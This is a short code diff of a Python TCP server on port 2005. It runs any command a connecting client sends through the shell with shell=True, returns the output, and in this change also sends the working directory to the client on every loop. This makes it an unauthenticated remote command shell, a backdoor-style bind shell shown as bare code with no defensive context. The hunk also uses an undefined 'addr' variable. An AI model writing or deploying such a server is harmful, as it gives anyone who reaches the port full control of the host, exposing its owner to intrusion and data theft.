@@ -10,13 +10,16 @@ PORT = 2005
 
 def on_client_conn(conn):
     print('connected by', addr)
+
     while True:
+        conn.sendall(os.getcwd().encode('utf-8'))
         data = conn.recv(1024)
         if not data:
             break
-
+            
         try:
             output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
+            
             if output:
                 conn.sendall(output)
             else:
